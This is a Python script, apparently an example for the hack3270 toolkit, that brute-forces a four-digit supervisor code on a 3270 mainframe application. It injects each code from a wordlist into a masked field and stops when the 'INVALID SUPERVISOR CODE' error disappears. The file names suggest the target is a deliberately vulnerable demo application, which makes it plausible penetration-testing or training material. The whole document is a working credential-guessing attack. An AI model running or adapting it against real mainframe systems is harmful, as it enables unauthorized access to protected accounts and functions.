#!/usr/bin/env python3
"""
brute.py - Brute force supervisor code using hack3270 API
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'hack3270_libs'))

import time
from hack3270_api import Hack3270API

# Configuration
TEMPLATE_ID = 41        # Log ID with mask (****)
MASK = '*'
INJECTION_FILE = '../injections/dvca-demo-numeric-4.txt'
ERROR_MSG = 'INVALID SUPERVISOR CODE'
DELAY = 0.3


def main():
    api = Hack3270API()
    api.load_db('dvca-brute.db')
    api.connect()
    
    print("Supervisor Code Brute Force")
    print("=" * 50)
    
    # Get template
    template = api.get_inject_template(TEMPLATE_ID, MASK)
    if template.get('status') != 'ok':
        print(f"Error: {template.get('message')}")
        return
    
    print(f"Mask: {template['mask_length']} chars")
    
    # Load codes
    codes = api.load_injection_file(INJECTION_FILE)
    print(f"Trying {len(codes)} codes...\n")
    
    # Brute force
    for i, code in enumerate(codes, 1):
        api.inject(template, code)
        time.sleep(DELAY)
        
        response = api.get_last_server()
        
        if ERROR_MSG not in response:
            print(f"\n*** FOUND: {code} ***")
            break
        
        if i % 10 == 0:
            print(f"[{i}/{len(codes)}]")
    
    api.disconnect()


if __name__ == '__main__':
    main()
